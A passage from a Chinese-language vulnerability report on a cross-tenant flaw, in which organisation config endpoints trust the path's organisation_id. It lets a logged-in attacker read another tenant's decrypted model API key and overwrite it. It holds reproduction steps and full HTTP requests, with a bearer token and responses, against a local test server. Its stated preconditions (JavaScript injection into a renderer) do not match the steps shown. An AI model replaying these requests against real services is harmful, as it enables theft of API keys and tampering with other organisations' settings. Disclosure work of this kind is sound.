key。\n3. 继续发送覆写请求并再次读取，确认受害者配置已被攻击者修改。\n二、研判分析\n前提条件: \n1. 用户运行XXX应用\n2. 攻击者能够注入或控制渲染进程中的JavaScript代码\n实际可行性评估: \n漏洞利用仅依赖已登录身份和可枚举组织 ID，稳定且成本低。\n1. 漏洞原理\n该漏洞的根因是组织配置读写接口直接信任路径参数中的 organisation_id。读取接口会把数据库中的 model_api_key 解密后返回给调用者，而写入接口又允许攻击者对同一组织配置执行覆盖操作，形成跨租户读取与篡改闭环。\n2. 复现步骤\n1. 使用攻击者 JWT 请求 GET /configs/get/organisation/1，读取受害者组织配置。\n2. 确认响应中的 model_api_key 已以明文形式返回。\n3. 使用攻击者 JWT 调用 POST /configs/add/organisation/1 覆写受害者组织配置。\n4. 再次请求 GET /configs/get/organisation/1，确认新值已生效。\n3. 请求响应截图\n3.1 步骤1 读取受害者组织配置\n请求：\nGET /configs/get/organisation/1 HTTP/1.1\nHost: 127.0.0.1:18001\nUser-Agent: python-requests/2.33.1\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\nAuthorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlckBleGFtcGxlLmNvbSIsImlhdCI6MTc3ODMyMTU2OSwibmJmIjoxNzc4MzIxNTY5LCJqdGkiOiI0MGZkNWQyOS05MTQzLTRjMjktODFmOC1iZTRiMmEwZjVhZWYiLCJleHAiOjE3Nzg0MDc5NjksInR5cGUiOiJhY2Nlc3MiLCJmcmVzaCI6ZmFsc2V9.R77e9whInzmebWhl2LOG0GD8rQGR25NlRtqSlqa_oUY\n​\n​\n响应：\nHTTP/1.1 201 Created\ndate: Sat, 09 May 2026 10:12:48 GMT\nserver: uvicorn\ncontent-length: 168\ncontent-type: application/json\n​\n[{\"value\":\"victim-real-model-key\",\"id\":1,\"created_at\":\"2026-05-09T10:12:49.055499\",\"key\":\"model_api_key\",\"organisation_id\":1,\"updated_at\":\"2026-05-09T10:12:49.055501\"}]\n3.2 步骤2 覆写受害者组织配置\n请求：\nPOST /configs/add/organisation/1 HTTP/1.1\nHost: 127.0.0.1:18001\nUser-Agent: python-requests/2.33.1\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\nAuthorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlckBleGFtcGxlLmNvbSIsImlhdCI6MTc3ODMyMTU2OSwibmJmIjoxNzc4MzIxNTY5LCJqdGkiOiI0MGZkNWQyOS05MTQzLTRjMjktODFmOC1iZTRiMmEwZjVhZWYiLCJleHAiOjE3Nzg0MDc5NjksInR5cGUiOiJhY2Nlc3MiLCJmcmVzaCI6ZmFsc2V9.R77e9whInzmebWhl2LOG0GD8rQGR25NlRtqSlqa_oUY\nContent-Length: 81\nContent-Type: application/json\n​\n{\"organisation_id\": 1, \"key\": \"model_api_key\", \"value\": \"attacker-overwrite-key\"}\n响应：\nH